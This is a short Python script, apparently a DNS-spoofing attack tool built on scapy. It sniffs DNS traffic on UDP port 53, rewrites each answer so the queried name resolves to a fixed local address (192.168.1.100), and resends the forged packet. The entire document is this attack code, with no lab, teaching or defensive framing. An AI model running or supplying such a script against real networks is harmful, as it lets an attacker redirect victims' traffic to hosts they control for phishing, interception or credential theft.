import scapy.all as scapy

def dns_spoof(packet):
    if packet.haslayer(scapy.DNSRR):
        qname = packet[scapy.DNS].qd.qname
        answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.100", ttl=3600)
        packet[scapy.DNS].an = answer
        packet[scapy.DNS].ancount = 1
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].chksum
        scapy.send(packet, verbose=False)

if __name__ == "__main__":
    scapy.sniff(filter="udp and port 53", prn=dns_spoof, store=0)